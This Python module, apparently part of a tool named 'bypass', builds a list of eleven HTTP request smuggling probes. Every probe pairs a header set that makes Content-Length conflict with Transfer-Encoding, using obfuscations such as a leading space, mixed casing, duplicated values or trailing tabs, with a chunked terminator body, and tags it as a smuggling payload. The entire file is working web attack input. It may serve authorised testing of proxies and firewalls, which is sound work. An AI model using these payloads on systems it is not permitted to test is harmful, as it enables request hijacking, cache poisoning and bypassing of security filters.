from __future__ import annotations

from bypass.models import Payload, PayloadCategory


def smuggling_lite_payloads() -> list[tuple[dict[str, str], bytes, Payload]]:
    probes: list[tuple[dict[str, str], bytes, str, str]] = [
        (
            {"Content-Length": "4", "Transfer-Encoding": "chunked"},
            b"0\r\n\r\n",
            "smuggle_cl_te_basic",
            "CL+TE baseline conflict",
        ),
        (
            {"Content-Length": "4", "Transfer-Encoding": "chunked", "Connection": "keep-alive"},
            b"0\r\n\r\n",
            "smuggle_cl_te_keepalive",
            "CL+TE with keep-alive",
        ),
        (
            {"Transfer-Encoding": " chunked", "Content-Length": "4"},
            b"0\r\n\r\n",
            "smuggle_te_space",
            "TE obfuscation leading space",
        ),
        (
            {"Transfer-Encoding": "chunked", "Content-Length": "4, 5"},
            b"0\r\n\r\n",
            "smuggle_dup_cl_comma",
            "Duplicated CL comma style",
        ),
        (
            {"Content-Length": "0", "Transfer-Encoding": "chunked", "X-Transfer-Encoding": "chunked"},
            b"0\r\n\r\n",
            "smuggle_x_te",
            "X-Transfer-Encoding confusion",
        ),
        (
            {"Content-Length": "4", "Transfer-Encoding": "chunked, identity"},
            b"0\r\n\r\n",
            "smuggle_te_multi",
            "TE multiple values",
        ),
        (
            {"Content-Length": "4", "Transfer-Encoding": "Chunked"},
            b"0\r\n\r\n",
            "smuggle_te_casing",
            "TE mixed casing",
        ),
        (
            {"Content-Length": "04", "Transfer-Encoding": "chunked"},
            b"0\r\n\r\n",
            "smuggle_cl_leading_zero",
            "CL leading zero + TE",
        ),
        (
            {"Content-Length": "+4", "Transfer-Encoding": "chunked"},
            b"0\r\n\r\n",
            "smuggle_cl_plus",
            "CL plus sign + TE",
        ),
        (
            {"Content-Length": "4 ", "Transfer-Encoding": "chunked"},
            b"0\r\n\r\n",
            "smuggle_cl_space",
            "CL trailing space + TE",
        ),
        (
            {"Content-Length": "4\t", "Transfer-Encoding": "chunked"},
            b"0\r\n\r\n",
            "smuggle_cl_tab",
            "CL trailing tab + TE",
        ),
    ]
    out: list[tuple[dict[str, str], bytes, Payload]] = []
    for hdrs, body, pid, label in probes:
        out.append(
            (
                hdrs,
                body,
                Payload(id=pid, category=PayloadCategory.SMUGGLING, label=label),
            )
        )
    return out
